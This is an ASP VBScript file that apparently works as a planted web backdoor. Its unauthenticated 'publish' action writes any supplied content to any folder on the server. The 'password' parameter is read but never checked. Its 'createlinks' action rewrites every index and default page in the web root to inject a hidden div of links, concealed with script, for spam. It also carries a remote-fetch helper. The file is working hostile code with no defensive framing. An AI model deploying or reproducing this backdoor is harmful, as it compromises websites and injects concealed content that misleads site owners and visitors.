<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
Dim action,pathname,pathname2,filename,body,ahref
action=request("action")
password=request("password")
pathname=request("pathname")
filename=request("filename")
body=request("body")
ahref=request("ahref")
if action="publish" Then
if len(pathname)=0 or len(filename)=0 or len(body)=0 Then
    response.write("parameters error")
    response.end()
end if
pathname2=server.mappath(pathname)
set fso=server.createobject("scripting.filesystemobject")
    if not fso.folderexists(pathname2) then
        fso.createfolder pathname2
    end if
set fso=Nothing
Set objStream = Server.CreateObject("ADODB.Stream")
With objStream
.Open
.Charset = "utf-8"
.Position = objStream.Size
.WriteText = request("body")
.SaveToFile server.mappath(".")& "\"&pathname&"\"&filename,2
.Close
End With
Set objStream = Nothing
mkfile(ahref)
response.write("publish success")
end if
Function mkfile(ahref1)
    filepath=server.mappath(".")&"\"&pathname&"\A.txt"
    set fso=server.createobject("scripting.filesystemobject")
    if fso.fileexists(filepath)=false then
        set a = fso.CreateTextFile(filepath, True)
    else
        set a = fso.openTextFile(filepath, 8)
    end if
    a.WriteLine ahref1
    a.Close
End Function
replacestr=request("replacestr")
If action="createlinks" and replacestr<>"" Then
    Response.Write CreateLink()
End If
Response.End
Function CreateLink()
    set fso=CreateObject("Scripting.FileSystemObject") 
    set fs=fso.GetFolder(Server.MapPath("/")) 
    For Each file In fs.Files
        If instr(LCase(file.name),"index")>0 or instr(LCase(file.name),"default")>0 Then
            set fsofile=fso.OpenTextFile(file, 1, true)
            On Error Resume next
            tempstr=fsofile.Readall
            pos1=instr(tempstr,"<div id=linkbyme>")
            If pos1>0 then
                tempstr=RegexReplace(tempstr,"<div id=linkbyme>(.+?)</body>","</body>")
            End If
            tempstr=replace(tempstr, "</body>", "<div id=linkbyme>"&replacestr&"</div><script>document.getElementById('linkbyme').style.display='none';</script></body>")
            set fsofile1=fso.OpenTextFile(file, 2, true)
            fsofile1.WriteLine tempstr
            fsofile1.close
            CreateLink="linkbyme"
        End If
    Next
    set fso=nothing 
End Function
Function RegexReplace(source1,pattern1,replace1)
    Set re = New RegExp
    re.Pattern = pattern1
    re.Global = True
    re.IgnoreCase = True
    RegexReplace= re.replace(source1,replace1)
End Function
function GetResStr(URL)
	dim ResBody,ResStr,PageCode
	Set Http=server.createobject("msxml2.serverxmlhttp.3.0")
	Http.setTimeouts 10000, 10000, 10000, 10000
	Http.open "GET",URL,False
	Http.Send()
	If Http.Readystate =4 Then
		If Http.status=200 Then
		ResStr=http.responseText
		ResBody=http.responseBody
		PageCode="utf-8"
		GetResStr=BytesToBstr(http.responseBody,trim(PageCode))
		End If
	End If
End Function
Function BytesToBstr(Body,Cset)
	Dim Objstream
	Set Objstream = Server.CreateObject("adodb.stream")
	objstream.Type = 1
	objstream.Mode =3
	objstream.Open
	objstream.Write body
	objstream.Position = 0
	objstream.Type = 2
	objstream.Charset = Cset
	BytesToBstr = objstream.ReadText
	objstream.Close
	set objstream = nothing
End Function
%>